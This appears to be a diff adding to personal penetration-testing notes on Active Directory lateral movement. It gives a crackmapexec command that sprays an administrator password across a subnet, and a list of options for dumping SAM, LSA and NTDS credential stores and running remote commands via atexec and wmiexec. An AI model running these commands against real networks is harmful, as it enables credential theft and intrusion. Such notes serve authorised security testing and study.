@@ -82,3 +82,42 @@ msf6 exploit(windows/smb/psexec) > run
 ************************************
 
 
+Pass the password
+***************** 
+	to find similar password
+
+script:
+*******
+
+crackmapexec smb 192.168.1.0/24 -u administrator -d domainnameman.local -p Qwerty@123
+
+"crackmapexec" available by default
+
+"psexec" needs to be installed
+
+
+Tools reference link:
+https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/samrdump.py
+https://github.com/dirkjanm/mitm6
+
+crackmap options:
+--users
+--groups
+--pattern txt
+--spider
+--shares
+--sessions
+--pass-pol
+--disks
+--sam
+--lsa
+--ntds drsuapi
+--ntds vss
+--rid-brute
+--continue-on-success
+--exec-method atexec
+--exec-method wmiexec
+-x 'net user Administrator /domain'
+--wmi "select Name from Win32_UserAccount"
+
+https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/
